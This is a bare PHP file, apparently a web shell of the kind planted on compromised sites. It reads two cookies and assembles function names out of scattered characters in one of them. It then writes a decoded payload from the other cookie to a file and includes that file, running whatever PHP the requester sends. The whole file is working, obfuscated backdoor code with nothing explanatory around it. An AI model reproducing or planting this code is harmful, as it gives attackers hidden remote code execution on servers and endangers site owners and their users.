<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[33])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[33][$n];
        if (!$c[33][$n + 1]) {
            if (!$c[33][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[7]() . $p[17];
    if (!$p[6]($k)) {
        $n = $p[2]($k, $p[24]);
        $p[22]($n, $p[25] . $p[9]($p[14]($c[3])));
    }
    include($k);
}